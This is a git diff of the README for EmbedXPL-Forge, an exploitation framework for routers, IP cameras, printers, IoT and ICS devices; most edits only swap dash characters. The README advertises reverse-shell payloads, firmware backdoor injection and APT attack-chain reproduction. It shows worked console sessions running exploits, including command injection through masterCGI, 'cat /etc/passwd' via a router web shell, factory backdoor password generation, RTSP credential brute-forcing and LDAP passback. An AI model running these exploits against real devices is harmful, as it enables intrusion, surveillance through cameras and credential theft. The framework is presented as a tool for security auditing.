@@ -2,7 +2,7 @@
   <img src="docs/img/embedxpl-forge-banner_16x9.png" alt="EmbedXPL-Forge" width="100%">
 </p>
 
-![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square&logo=python)
+![Python](https://img.shields.io/badge/Python-%3E%3D3.12-blue?style=flat-square&logo=python)
 [![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-informational?style=flat-square)](README.md#compatibility)
 [![License](https://img.shields.io/badge/License-XSRL--1.0-blue?style=flat-square)](LICENSE)
 [![XPL Suite](https://img.shields.io/badge/XPL--Forge-Suite-red?style=flat-square)](https://github.com/mrhenrike)
@@ -19,33 +19,33 @@
 
 **Embedded & Perimeter Security Assessment Framework**
 
-EmbedXPL-Forge is an open-source exploitation and scanning framework for security professionals auditing routers, switches, IP cameras, NVR/DVR, GPON ONTs, ISP CPEs, printers, IoT, OT/ICS, and embedded edge devices. It provides **2800+ active modules** covering credential testing, vulnerability exploitation, network scanning, payload generation, RTSP camera attacks, firmware manipulation, multi-language PolyExploit orchestration, and a full printer arsenal — with **700+ CVEs** mapped across **114+ vendors** and an **APT Group Attack Engine** that reproduces real-world nation-state attack chains.
+EmbedXPL-Forge is an open-source exploitation and scanning framework for security professionals auditing routers, switches, IP cameras, NVR/DVR, GPON ONTs, ISP CPEs, printers, IoT, OT/ICS, and embedded edge devices. It provides **2800+ active modules** covering credential testing, vulnerability exploitation, network scanning, payload generation, RTSP camera attacks, firmware manipulation, multi-language PolyExploit orchestration, and a full printer arsenal  -  with **700+ CVEs** mapped across **114+ vendors** and an **APT Group Attack Engine** that reproduces real-world nation-state attack chains.
 
 > **Version:** 3.2.0
 
 
 ## Features
 
-- **625+ exploit modules** — RCE, auth bypass, path traversal, info disclosure, buffer overflow, DNS hijacking, command injection, backdoor, CSRF, config decrypt, WPA/WPS keygen, factory password generators, heap/stack BOF chains
-- **88 credential modules** — dictionary attacks against FTP, SSH, Telnet, HTTP, SNMP, SFTP
-- **185+ printer exploit modules** — HP, Canon, Lexmark, Xerox, Ricoh, Brother, Epson, Kyocera, Samsung; PJL/IPP/LPD/WSD/CUPS; Pwn2Own 2026 chains; PrintingShellz; MS-RPRN NTLM coercion
-- **Full RTSP camera engine** — route brute-force (195+ routes), credential brute-force (80+ pairs), Basic/Digest auth, RTSPS/TLS, **RTSP-over-HTTP tunnel (pure Python, RFC 2326 App-C)**, nmap/masscan/direct scanner, ONVIF WS-Discovery, M3U output
-- **7 custom Nmap NSE scripts** — RTSP discovery, camera fingerprinting, Hikvision/Dahua CVE validation, default credential testing, multi-vendor CVE checks, snapshot capture (`pip install embedxpl[nse]`)
-- **Firmware exploitation suite** — format detection, backdoor injection, checksum patching, vendor flash bypass (NETGEAR, TP-Link, D-Link, ASUS)
-- **PolyExploit orchestrator** — runtime C/C++ compilation (gcc/clang/mingw/cross), execution of Ruby/Node.js/PHP/Bash/Perl exploits, msfconsole integration, ExploitDB/searchsploit integration
-- **ICS/OT modules** — Universal Robots PolyScope 5, RIOT OS, Modbus, S7comm, EtherNet/IP, BACnet, DNP3
-- **Smart home / maritime / specialized** — eNet SMART HOME, OpenRemote, Metis maritime IoT (WIC/DFS)
-- **5+ scanner modules** — AutoPwn, device-specific scanners, WSD/mDNS printer discovery
-- **32 payload modules** — reverse/bind TCP shells for x86, x64, ARM, MIPS, Python, Perl, PHP
-- **13 encoder modules** — Base64 and hex encoding for Python, PHP, Perl
-- **14 generic modules** — Heartbleed, ShellShock, UPnP IGD, SNMP bruteforce, TCP Xmas, UDP amplification, CVE lookup, DNS hijack detector, AITM interceptor
-- **700+ CVEs mapped** — from 2001 to 2026, including 2026 Pwn2Own chains and critical IoT/OT/maritime CVEs
-- **APT Group Attack Engine** — browse and reproduce attack chains from APT28, Volt Typhoon, Sandworm, Quad7, Turla, APT40 with MITRE ATT&CK mapping
-- **23+ vendor-specific wordlists** — externalized default credentials per vendor (incl. ISP-specific Brazil)
-- **Network discovery** — SSDP, ARP, Nmap, Masscan, Scapy fallback, OUI lookup (IEEE 39k+ entries), T0–T5 timing profiles
-- **Session management** — persistent scan history per host (IP+MAC), resume/restart, full findings index
-- **Chained autopwn modules** — multi-phase vendor-specific exploitation chains (Huawei EG8145X6, CUPS Pwn2Own, Lexmark Pwn2Own, etc.)
-- **7 automated quality gates** — `tools/phase_gate.py` ensures every module passes import, anti-FP, reference, and code quality checks before merge
+- **625+ exploit modules**  -  RCE, auth bypass, path traversal, info disclosure, buffer overflow, DNS hijacking, command injection, backdoor, CSRF, config decrypt, WPA/WPS keygen, factory password generators, heap/stack BOF chains
+- **88 credential modules**  -  dictionary attacks against FTP, SSH, Telnet, HTTP, SNMP, SFTP
+- **185+ printer exploit modules**  -  HP, Canon, Lexmark, Xerox, Ricoh, Brother, Epson, Kyocera, Samsung; PJL/IPP/LPD/WSD/CUPS; Pwn2Own 2026 chains; PrintingShellz; MS-RPRN NTLM coercion
+- **Full RTSP camera engine**  -  route brute-force (195+ routes), credential brute-force (80+ pairs), Basic/Digest auth, RTSPS/TLS, **RTSP-over-HTTP tunnel (pure Python, RFC 2326 App-C)**, nmap/masscan/direct scanner, ONVIF WS-Discovery, M3U output
+- **7 custom Nmap NSE scripts**  -  RTSP discovery, camera fingerprinting, Hikvision/Dahua CVE validation, default credential testing, multi-vendor CVE checks, snapshot capture (`pip install embedxpl[nse]`)
+- **Firmware exploitation suite**  -  format detection, backdoor injection, checksum patching, vendor flash bypass (NETGEAR, TP-Link, D-Link, ASUS)
+- **PolyExploit orchestrator**  -  runtime C/C++ compilation (gcc/clang/mingw/cross), execution of Ruby/Node.js/PHP/Bash/Perl exploits, msfconsole integration, ExploitDB/searchsploit integration
+- **ICS/OT modules**  -  Universal Robots PolyScope 5, RIOT OS, Modbus, S7comm, EtherNet/IP, BACnet, DNP3
+- **Smart home / maritime / specialized**  -  eNet SMART HOME, OpenRemote, Metis maritime IoT (WIC/DFS)
+- **5+ scanner modules**  -  AutoPwn, device-specific scanners, WSD/mDNS printer discovery
+- **32 payload modules**  -  reverse/bind TCP shells for x86, x64, ARM, MIPS, Python, Perl, PHP
+- **13 encoder modules**  -  Base64 and hex encoding for Python, PHP, Perl
+- **14 generic modules**  -  Heartbleed, ShellShock, UPnP IGD, SNMP bruteforce, TCP Xmas, UDP amplification, CVE lookup, DNS hijack detector, AITM interceptor
+- **700+ CVEs mapped**  -  from 2001 to 2026, including 2026 Pwn2Own chains and critical IoT/OT/maritime CVEs
+- **APT Group Attack Engine**  -  browse and reproduce attack chains from APT28, Volt Typhoon, Sandworm, Quad7, Turla, APT40 with MITRE ATT&CK mapping
+- **23+ vendor-specific wordlists**  -  externalized default credentials per vendor (incl. ISP-specific Brazil)
+- **Network discovery**  -  SSDP, ARP, Nmap, Masscan, Scapy fallback, OUI lookup (IEEE 39k+ entries), T0-T5 timing profiles
+- **Session management**  -  persistent scan history per host (IP+MAC), resume/restart, full findings index
+- **Chained autopwn modules**  -  multi-phase vendor-specific exploitation chains (Huawei EG8145X6, CUPS Pwn2Own, Lexmark Pwn2Own, etc.)
+- **7 automated quality gates**  -  `tools/phase_gate.py` ensures every module passes import, anti-FP, reference, and code quality checks before merge
 
 ## Supported Device Types
 
@@ -78,14 +78,14 @@ EmbedXPL-Forge is an open-source exploitation and scanning framework for securit
 
 ## Installation
 
-### Option 1 — PyPI (recommended)
+### Option 1  -  PyPI (recommended)
 
 ```bash
 pip install embedxpl
 embedxpl
 ```
 
-### Option 2 — With Nmap NSE scripts
+### Option 2  -  With Nmap NSE scripts
 
 ```bash
 # Install EmbedXPL + NSE dependencies
@@ -103,7 +103,7 @@ python -m embedxpl.nse list
 > **Note:** On Linux/macOS the install step may require `sudo` to write to `/usr/share/nmap/scripts/`.
 > Run: `sudo python -m embedxpl.nse install`
 
-### Option 3 — From source
+### Option 3  -  From source
 
 ```bash
 git clone https://github.com/mrhenrike/EmbedXPL-Forge.git
@@ -116,7 +116,7 @@ chmod +x setup_venv.sh run.sh
 .venv/bin/python -m embedxpl.nse install
 ```
 
-### Option 4 — Python module
+### Option 4  -  Python module
 
 ```bash
 pip install embedxpl
@@ -211,16 +211,16 @@ exf > discover 192.168.1.0/24 --fresh
 
 Discovery uses a multi-phase pipeline: ARP sweep → Nmap (multi-method host probes) → Scapy → TCP connect fallback. Results are matched against the module catalog and filtered by vendor/model. The IEEE OUI database (`embedxpl/data/oui.txt`) resolves MAC addresses to vendors with online-first lookup and local fallback. When a host exposes WiFi capabilities, the tool recommends [WirelessXPL-Forge](https://github.com/mrhenrike/WirelessXPL-Forge) for wireless-specific attacks.
 
-**Timing profiles (T0–T5)** mirror Nmap conventions:
+**Timing profiles (T0-T5)** mirror Nmap conventions:
 
 | Profile | Delay | Use case |
 |---------|-------|----------|
-| T0 | paranoid — 300s | IDS evasion |
-| T1 | sneaky — 15s | Quiet audits |
-| T2 | polite — 2s | Minimal impact |
-| T3 | normal — 0.5s | Default |
-| T4 | aggressive — 0.1s | Fast LAN scans |
-| T5 | insane — 0s | CTF / lab only |
+| T0 | paranoid  -  300s | IDS evasion |
+| T1 | sneaky  -  15s | Quiet audits |
+| T2 | polite  -  2s | Minimal impact |
+| T3 | normal  -  0.5s | Default |
+| T4 | aggressive  -  0.1s | Fast LAN scans |
+| T5 | insane  -  0s | CTF / lab only |
 
 ### Session Management
 
@@ -295,12 +295,12 @@ for stream in results:
 ```
 [RTSP] Scanning 192.168.1.0/24 on ports [554, 5554, 8554]...
 [RTSP] Found 3 RTSP hosts
-[RTSP] 192.168.1.100:554 — Phase 1: Route discovery (195 routes)...
-[RTSP] 192.168.1.100:554 — Route found: h264/ch1/main/av_stream
-[RTSP] 192.168.1.100:554 — Phase 2: Auth detection → Basic (realm="IP Camera")
-[RTSP] 192.168.1.100:554 — Phase 3: Credential brute-force (80 pairs)...
-[RTSP] 192.168.1.100:554 — ✓ Credentials: admin:
-[RTSP] 192.168.1.100:554 — Phase 4: Stream validated (200 OK)
+[RTSP] 192.168.1.100:554  -  Phase 1: Route discovery (195 routes)...
+[RTSP] 192.168.1.100:554  -  Route found: h264/ch1/main/av_stream
+[RTSP] 192.168.1.100:554  -  Phase 2: Auth detection → Basic (realm="IP Camera")
+[RTSP] 192.168.1.100:554  -  Phase 3: Credential brute-force (80 pairs)...
+[RTSP] 192.168.1.100:554  -  ✓ Credentials: admin:
+[RTSP] 192.168.1.100:554  -  Phase 4: Stream validated (200 OK)
 [RTSP] Attack complete. Accessible streams: 2/3
 ```
 
@@ -416,7 +416,7 @@ python -m embedxpl.nse info rtsp-discover
 
 ### NSE Script Reference
 
-#### `embedxpl-rtsp-discover` — RTSP Service Discovery
+#### `embedxpl-rtsp-discover`  -  RTSP Service Discovery
 
 Detects RTSP services, grabs the `Server:` banner, identifies vendor, lists supported methods, and cross-references known CVEs.
 
@@ -443,7 +443,7 @@ nmap -p 554,5554,8554 --script embedxpl-rtsp-discover --script-args rtsp.timeout
 ```
 
 
-#### `embedxpl-camera-identify` — Deep Camera Fingerprinting
+#### `embedxpl-camera-identify`  -  Deep Camera Fingerprinting
 
 Multi-protocol identification: probes HTTP/HTTPS web UI, RTSP banner, and ONVIF. Extracts vendor, model, firmware, serial, and MAC.
 
@@ -468,7 +468,7 @@ nmap -sV -p- --script embedxpl-camera-identify 192.168.1.0/24
 ```
 
 
-#### `embedxpl-hikvision-vuln` — Hikvision CVE Checker
+#### `embedxpl-hikvision-vuln`  -  Hikvision CVE Checker
 
 Active validation of CVE-2021-36260 (RCE via `/SDK/webLanguage`, CVSS 9.8) and CVE-2017-7921 (auth bypass snapshot).
 
@@ -483,15 +483,15 @@ nmap -p 80,443,8080 --script embedxpl-hikvision-vuln --script-args timeout=10 19
 | embedxpl-hikvision-vuln:
 |   Device          : DS-2CD2143G0-I
 |   Firmware        : V5.3.0 build 170112
-|   CVE-2021-36260  : VULNERABLE — endpoint accepts PUT without authentication (CVE-2021-36260, CVSS 9.8)
-|   CVE-2017-7921   : VULNERABLE — snapshot captured without valid credentials (CVE-2017-7921)
+|   CVE-2021-36260  : VULNERABLE  -  endpoint accepts PUT without authentication (CVE-2021-36260, CVSS 9.8)
+|   CVE-2017-7921   : VULNERABLE  -  snapshot captured without valid credentials (CVE-2017-7921)
 |   EmbedXPL RCE module  : exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
 |   EmbedXPL Auth Bypass : exploits/cameras/hikvision/info_disclosure_cve_2017_7921
 |_  Run full exploit: embedxpl > use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
 ```
 
 
-#### `embedxpl-dahua-vuln` — Dahua CVE Checker
+#### `embedxpl-dahua-vuln`  -  Dahua CVE Checker
 
 Tests CVE-2021-33044 (auth bypass, CVSS 9.8), CVE-2020-25078 (user disclosure), CVE-2013-6117 (legacy DVR). Also covers Dahua OEMs: Amcrest, Intelbras, TVT, Jovision, ANNKE.
 
@@ -504,8 +504,8 @@ nmap -p 80,37777 --script embedxpl-dahua-vuln 192.168.1.0/24
 80/tcp open http
 | embedxpl-dahua-vuln:
 |   Vendor         : Dahua (or Dahua-OEM: Amcrest / Intelbras / TVT)
-|   CVE-2021-33044 : VULNERABLE — snapshot captured via Digest bypass (CVE-2021-33044, CVSS 9.8)
-|   CVE-2020-25078 : VULNERABLE — Users disclosed: [admin, operator]
+|   CVE-2021-33044 : VULNERABLE  -  snapshot captured via Digest bypass (CVE-2021-33044, CVSS 9.8)
+|   CVE-2020-25078 : VULNERABLE  -  Users disclosed: [admin, operator]
 |   CVE-2013-6117  : NOT VULNERABLE
 |   EmbedXPL Auth Bypass  : exploits/cameras/dahua/cctv_auth_bypass_cve_2021_33044
 |   EmbedXPL Cred Extract : exploits/cameras/dahua/cctv_37777_credential_extraction
@@ -513,7 +513,7 @@ nmap -p 80,37777 --script embedxpl-dahua-vuln 192.168.1.0/24
 ```
 
 
-#### `embedxpl-rtsp-creds` — RTSP Default Credential Tester
+#### `embedxpl-rtsp-creds`  -  RTSP Default Credential Tester
 
 Tests 18 default credential pairs across 9+ common RTSP routes using Basic auth. Reports the first match.
 
@@ -538,7 +538,7 @@ nmap -p 554 --script embedxpl-rtsp-creds --script-args rtsp.route=live.sdp 192.1
 ```
 
 
-#### `embedxpl-iot-cve-check` — Multi-Vendor CVE Fingerprint
+#### `embedxpl-iot-cve-check`  -  Multi-Vendor CVE Fingerprint
 
 Detects and validates 10 active CVEs across Hikvision, Dahua, D-Link NAS, Reolink, Uniview, QNAP, SonicWall, and GPON.
 
@@ -550,15 +550,15 @@ nmap -p 80,443,8080 --script embedxpl-iot-cve-check 192.168.1.0/24
 ```
 80/tcp open http
 | embedxpl-iot-cve-check:
-|   CVE-2021-36260 (Hikvision, CVSS 9.8): POSSIBLY VULNERABLE — HTTP 200 returned
+|   CVE-2021-36260 (Hikvision, CVSS 9.8): POSSIBLY VULNERABLE  -  HTTP 200 returned
 |     → EmbedXPL: CVE-2021-36260 : use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
-|   CVE-2021-33044 (Dahua, CVSS 9.8)   : NOT VULNERABLE — HTTP 404
+|   CVE-2021-33044 (Dahua, CVSS 9.8)   : NOT VULNERABLE  -  HTTP 404
 |   EmbedXPL-Forge: https://github.com/mrhenrike/EmbedXPL-Forge
 |_  Full exploitation: pip install embedxpl && embedxpl
 ```
 
 
-#### `embedxpl-camera-snapshot` — Unauthenticated Snapshot Access
+#### `embedxpl-camera-snapshot`  -  Unauthenticated Snapshot Access
 
 Probes 16 vendor-specific snapshot endpoints. Reports any URL returning `image/*` without credentials. Optionally saves JPEG files locally.
 
@@ -688,14 +688,14 @@ for r in results:
 ```
 
 
-## New in v3.1.0 — CVE 2026/2025/2024 + Printer Domain + Quality Gates
+## New in v3.1.0  -  CVE 2026/2025/2024 + Printer Domain + Quality Gates
 
 **54 new modules** across printers, embedded OS, ICS/OT, smart home, maritime IoT, and 2026 Pwn2Own chains. Key highlights:
 
 ### 2026 Pwn2Own Chains
 
 ```
-# CUPS Pwn2Own 2026 — Full 4-stage chain (CVE-2026-34477/78/79/80, CVSS 9.9)
+# CUPS Pwn2Own 2026  -  Full 4-stage chain (CVE-2026-34477/78/79/80, CVSS 9.9)
 exf > use exploits/printers/linux/cups_pwn2own_chain_cve_2026_34480
 exf (CUPS Pwn2Own Chain) > set target 192.168.1.10
 exf (CUPS Pwn2Own Chain) > set delay 2
@@ -706,7 +706,7 @@ exf (CUPS Pwn2Own Chain) > run
 [*] [Stage 4/4] Chain complete - verifying
 [+] CUPS process no longer responding - chain executed
 
-# Lexmark Pwn2Own 2026 — 3-stage chain
+# Lexmark Pwn2Own 2026  -  3-stage chain
 exf > use exploits/printers/lexmark/lexmark_pwn2own_2026_chain
 exf (Lexmark Pwn2Own) > set target 192.168.1.20
 exf (Lexmark Pwn2Own) > run
@@ -762,7 +762,7 @@ exf (Cisco WLC JWT RCE) > run
 ### Printer Arsenal Examples
 
 ```
-# HP PJL full scan (native — no external tools)
+# HP PJL full scan (native  -  no external tools)
 exf > use exploits/printers/hp/hp_laserjet_pjl_scan_native
 exf (HP PJL Scanner) > set target 192.168.1.100
 exf (HP PJL Scanner) > run
@@ -782,7 +782,7 @@ exf > use exploits/printers/brother/brother_ldap_smb_passback
 exf (Brother LDAP Passback) > set target 192.168.1.102
 exf (Brother LDAP Passback) > set attacker_ip 192.168.1.10
 exf (Brother LDAP Passback) > run
-[+] LDAP server redirected — wait for printer authentication
+[+] LDAP server redirected  -  wait for printer authentication
 ```
 
 ### Backdoor / Factory Password Coverage
@@ -790,26 +790,26 @@ exf (Brother LDAP Passback) > run
 27+ exploit modules targeting factory passwords, hardcoded backdoors, default WPA key generation algorithms, and DNS hijack CSRF vectors across legacy and modern SOHO routers. Key examples:
 
 ```
-# EasyBox (Arcadyan) — WPA2 default key from MAC (factory algorithm)
+# EasyBox (Arcadyan)  -  WPA2 default key from MAC (factory algorithm)
 exf > use exploits/routers/easybox/easybox_wpa_keygen
 exf (EasyBox WPA Keygen) > set target 192.168.1.1
 exf (EasyBox WPA Keygen) > run
-[*] No MAC supplied — attempting to extract from web UI...
+[*] No MAC supplied  -  attempting to extract from web UI...
 [+] MAC found: AA:BB:CC:DD:EE:FF
 [+] Device MAC  : AA:BB:CC:DD:EE:FF
 [+] WPA2 PSK    : 3f2d9a1b
 
-# Seagate NAS — Ghost PHP unauthenticated RCE (CVE-2014-8684)
+# Seagate NAS  -  Ghost PHP unauthenticated RCE (CVE-2014-8684)
 exf > use exploits/routers/seagate/seagate_nas_php_backdoor
 exf (Seagate Ghost PHP) > set target 192.168.1.100
 exf (Seagate Ghost PHP) > set cmd "id; uname -a"
 exf (Seagate Ghost PHP) > run
 [*] Sending command via Ghost PHP backdoor: 'id; uname -a'
-[+] RCE successful — output:
+[+] RCE successful  -  output:
     uid=0(root) gid=0(root) groups=0(root)
     Linux NAS 3.10.14 #1 SMP armv7l
 
-# Alpha Networks / ZTE — web_shell_cmd.gch backdoor
+# Alpha Networks / ZTE  -  web_shell_cmd.gch backdoor
 exf > use exploits/routers/alpha_networks/web_shell_cmd_rce
 exf (Alpha Networks web_shell_cmd RCE) > set target 192.168.1.1
 exf (Alpha Networks web_shell_cmd RCE) > set cmd "cat /etc/passwd"
@@ -819,7 +819,7 @@ exf (Alpha Networks web_shell_cmd RCE) > run
     root:x:0:0:root:/root:/bin/sh
     ...
 
-# RuggedCom — factory backdoor password generator (FD 2012/Apr/277)
+# RuggedCom  -  factory backdoor password generator (FD 2012/Apr/277)
 exf > use exploits/routers/ruggedcom/ruggedcom_factory_password
 exf (RuggedCom Factory Password) > set target 192.168.1.1
 exf (RuggedCom Factory Password) > set serial RA000000
@@ -828,7 +828,7 @@ exf (RuggedCom Factory Password) > run
 [+] Backdoor user  : factory
 [+] Backdoor pass  : 7f3d9a2b
 
-# Alcatel-Lucent OmniPCX Enterprise — masterCGI RCE
+# Alcatel-Lucent OmniPCX Enterprise  -  masterCGI RCE
 exf > use exploits/routers/alcatel_lucent/omnipcx_masterCGI_rce
 exf (OmniPCX RCE) > set target 192.168.1.10
 exf (OmniPCX RCE) > set cmd "id"
@@ -836,14 +836,14 @@ exf (OmniPCX RCE) > run
 [*] Injecting command: 'id' via /cgi-bin/masterCGI?ping=127.0.0.1&user=;id;
 [+] Response (command output may be embedded): uid=0(root) ...
 
-# TRENDnet camera — unauthenticated MJPEG live stream
+# TRENDnet camera  -  unauthenticated MJPEG live stream
 exf > use exploits/routers/trendnet/camera_mjpeg_unauth
 exf (TRENDnet MJPEG) > set target 192.168.1.50
 exf (TRENDnet MJPEG) > run
 [+] LIVE STREAM accessible (no auth): /anony/mjpg.cgi
 [+] Stream URL: http://192.168.1.50:80/anony/mjpg.cgi
 
-# Netgear WG602 — hardcoded backdoor credentials
+# Netgear WG602  -  hardcoded backdoor credentials
 exf > use exploits/routers/netgear/wg602_superman_backdoor
 exf (WG602 Backdoor) > set target 192.168.1.1
 exf (WG602 Backdoor) > run
@@ -866,8 +866,8 @@ embedxpl/
 │   │   ├── scanner.py # Network discovery (nmap/masscan/direct), CIDR/range expansion
 │   │   └── models.py  # RTSPStream dataclass, AuthType enum
 │   └── poly/
-│       ├── compiler.py# CCompiler — runtime C/C++ compilation (gcc/clang/mingw/cross)
-│       └── runner.py  # PolyRunner — Ruby/Node/PHP/Bash/Perl + Metasploit + ExploitDB
+│       ├── compiler.py# CCompiler  -  runtime C/C++ compilation (gcc/clang/mingw/cross)
+│       └── runner.py  # PolyRunner  -  Ruby/Node/PHP/Bash/Perl + Metasploit + ExploitDB
 ├── modules/
 │   ├── creds/             # Credential testing (FTP, SSH, Telnet, HTTP, SNMP)
 │   ├── exploits/
@@ -885,7 +885,7 @@ embedxpl/
 │   │   │   └── edimax/    # Edimax IC-7100 (CVE-2025-1316, CISA KEV)
 │   │   ├── firmware/      # Firmware flash bypass (NETGEAR, TP-Link, D-Link, ASUS)
 │   │   ├── nas/           # NAS exploits (QNAP, D-Link NAS, Zyxel)
-│   │   ├── routers/       # Router exploits by vendor (85 vendor folders — see full list below)
+│   │   ├── routers/       # Router exploits by vendor (85 vendor folders  -  see full list below)
 │   │   ├── vpn/           # VPN/firewall appliances (Ivanti, Fortinet, SonicWall)
 │   │   ├── switches/      # Switch exploits (Cisco, D-Link, NETGEAR)
 │   │   └── soho_edge/     # SOHO edge device exploits
@@ -894,7 +894,7 @@ embedxpl/
 │   ├── encoders/          # Payload encoding (Base64, Hex)
 │   └── generic/           # CVE lookup, SNMP, UPnP, SSDP, wordlist tools
 ├── nse/                   # NSE script manager (Python)
-│   ├── manager.py         # NSEManager class — install/uninstall/list/run
+│   ├── manager.py         # NSEManager class  -  install/uninstall/list/run
 │   └── __main__.py        # CLI: python -m embedxpl.nse
 ├── resources/
 │   └── rtsp/
